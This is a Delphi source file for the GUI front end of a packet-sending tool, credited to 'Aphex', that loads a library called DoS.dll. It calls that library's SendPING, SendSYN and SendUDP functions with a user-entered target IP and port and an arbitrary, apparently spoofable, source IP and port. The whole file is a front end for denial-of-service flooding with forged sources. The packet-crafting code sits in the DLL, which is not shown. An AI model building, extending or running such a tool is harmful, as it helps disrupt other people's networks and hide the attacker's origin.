unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, ComCtrls, Menus;

type
  TForm1 = class(TForm)
    Panel3: TPanel;
    uEdit1: TEdit;
    uEdit2: TEdit;
    uEdit3: TEdit;
    uEdit4: TEdit;
    uCheckBox1: TCheckBox;
    uLabel1: TLabel;
    uLabel2: TLabel;
    uLabel3: TLabel;
    uEdit5: TEdit;
    TabControl1: TTabControl;
    Panel1: TPanel;
    iLabel1: TLabel;
    iLabel2: TLabel;
    iLabel3: TLabel;
    iEdit1: TEdit;
    iEdit2: TEdit;
    iCheckBox1: TCheckBox;
    iEdit3: TEdit;
    Panel2: TPanel;
    tLabel1: TLabel;
    tLabel2: TLabel;
    tEdit1: TEdit;
    tEdit2: TEdit;
    tEdit3: TEdit;
    tEdit4: TEdit;
    tCheckBox1: TCheckBox;
    MainMenu1: TMainMenu;
    File1: TMenuItem;
    Packets1: TMenuItem;
    About1: TMenuItem;
    Send1: TMenuItem;
    New1: TMenuItem;
    N1: TMenuItem;
    Exit1: TMenuItem;
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure iCheckBox1Click(Sender: TObject);
    procedure tCheckBox1Click(Sender: TObject);
    procedure uCheckBox1Click(Sender: TObject);
    procedure TabControl1Change(Sender: TObject);
    procedure Send1Click(Sender: TObject);
    procedure About1Click(Sender: TObject);
    procedure New1Click(Sender: TObject);
    procedure Exit1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  DoSHandle: Longint;
  DoSLoaded: Boolean = False;
  SendPING: procedure(pcTargetIP: pchar; pcSourceIP: pchar; pcData: pchar); stdcall;
  SendSYN: procedure(pcTargetIP: pchar; iTargetPort: integer; pcSourceIP: pchar; iSourcePort: integer); stdcall;
  SendUDP: procedure(pcTargetIP: pchar; iTargetPort: integer; pcSourceIP: pchar; iSourcePort: integer; pcData: pchar); stdcall;

implementation

{$R *.dfm}

procedure TForm1.FormCreate(Sender: TObject);
begin
  DoSHandle := LoadLibrary('DoS.dll');
  if DoSHandle > 0 then
  begin
    DoSLoaded := True;
    @SendPING := GetProcAddress(DoSHandle, 'SendPING');
    @SendSYN := GetProcAddress(DoSHandle, 'SendSYN');
    @SendUDP := GetProcAddress(DoSHandle, 'SendUDP');
  end;
end;

procedure TForm1.FormDestroy(Sender: TObject);
begin
  FreeLibrary(DoSHandle);
end;

procedure TForm1.iCheckBox1Click(Sender: TObject);
begin
  iEdit1.Enabled := iCheckBox1.Checked;
  iEdit2.Enabled := iCheckBox1.Checked;
  iEdit3.Enabled := iCheckBox1.Checked;
end;

procedure TForm1.tCheckBox1Click(Sender: TObject);
begin
  tEdit1.Enabled := tCheckBox1.Checked;
  tEdit2.Enabled := tCheckBox1.Checked;
  tEdit3.Enabled := tCheckBox1.Checked;
  tEdit4.Enabled := tCheckBox1.Checked;
end;

procedure TForm1.uCheckBox1Click(Sender: TObject);
begin
  uEdit1.Enabled := uCheckBox1.Checked;
  uEdit2.Enabled := uCheckBox1.Checked;
  uEdit3.Enabled := uCheckBox1.Checked;
  uEdit4.Enabled := uCheckBox1.Checked;
  uEdit5.Enabled := uCheckBox1.Checked;
end;

procedure TForm1.TabControl1Change(Sender: TObject);
begin
  if TabControl1.TabIndex = 0 then
  begin
    Panel1.Visible := True;
    Panel2.Visible := False;
    Panel3.Visible := False;
    TabControl1.Height := 169
  end
  else if TabControl1.TabIndex = 1 then
  begin
    Panel1.Visible := False;
    Panel2.Visible := True;
    Panel3.Visible := False;
    TabControl1.Height := 128
  end
  else if TabControl1.TabIndex = 2 then
  begin
    Panel1.Visible := False;
    Panel2.Visible := False;
    Panel3.Visible := True;
    TabControl1.Height := 169
  end;
end;

procedure TForm1.Send1Click(Sender: TObject);
begin
  if iCheckBox1.Checked then
  begin
    SendPING(pchar(iEdit1.Text), pchar(iEdit2.Text), pchar(iEdit3.Text));
  end;
  if tCheckBox1.Checked then
  begin
    SendSYN(pchar(tEdit1.Text), strtoint(tEdit2.Text), pchar(tEdit3.Text), strtoint(tEdit4.Text));
  end;
  if uCheckBox1.Checked then
  begin
    SendUDP(pchar(uEdit1.Text), strtoint(uEdit2.Text), pchar(uEdit3.Text), strtoint(uEdit4.Text), pchar(uEdit5.Text));
  end;
end;

procedure TForm1.About1Click(Sender: TObject);
begin
  ShowMessage('Programmer: Aphex                      ' + #13#10 + 'Version: 1.0 (Dynamic)' + #13#10 + 'Requires: Winsock 2.0')
end;

procedure TForm1.New1Click(Sender: TObject);
begin
  iEdit1.Text := '';
  iEdit2.Text := '';
  iEdit3.Text := '';
  iCheckBox1.Checked := True;
  tEdit1.Text := '';
  tEdit2.Text := '';
  tEdit3.Text := '';
  tEdit4.Text := '';
  tCheckBox1.Checked := False;
  uEdit1.Text := '';
  uEdit2.Text := '';
  uEdit3.Text := '';
  uEdit4.Text := '';
  uEdit5.Text := '';
  uCheckBox1.Checked := False;
end;

procedure TForm1.Exit1Click(Sender: TObject);
begin
  Application.Terminate;
end;

end.
